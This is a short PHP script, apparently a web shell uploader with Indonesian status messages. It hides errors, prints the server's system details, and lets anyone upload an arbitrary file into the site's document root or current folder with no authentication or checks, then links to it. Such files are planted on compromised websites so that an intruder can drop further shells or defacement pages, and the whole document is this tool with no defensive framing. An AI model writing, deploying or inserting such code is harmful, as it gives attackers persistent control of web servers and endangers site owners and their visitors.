<?php
error_reporting(0);
echo "<b>".php_uname()."</b><br>";

echo "<form method='post' enctype='multipart/form-data'><input type='file' name='idx_file'><input type='submit' name='upload' value='upload'></form>";

$root = $_SERVER['DOCUMENT_ROOT'];

$files = $_FILES['idx_file']['name'];

$dest = $root.'/'.$files;

if(isset($_POST['upload'])) {

	if(is_writable($root)) {

		if(@copy($_FILES['idx_file']['tmp_name'], $dest)) {

			$web = "http://".$_SERVER['HTTP_HOST']."/";

			echo "sukses -> <a href='$web/$files' target='_blank'><b><u>$web/$files</u></b></a>";

		} else {

			echo "gagal ;(";

		}

	} else {

		if(@copy($_FILES['idx_file']['tmp_name'], $files)) {

			echo "sukses upload <b>$files</b> di folder ini";

		} else {

			echo "gagal upload";

		}

	}

}

?>
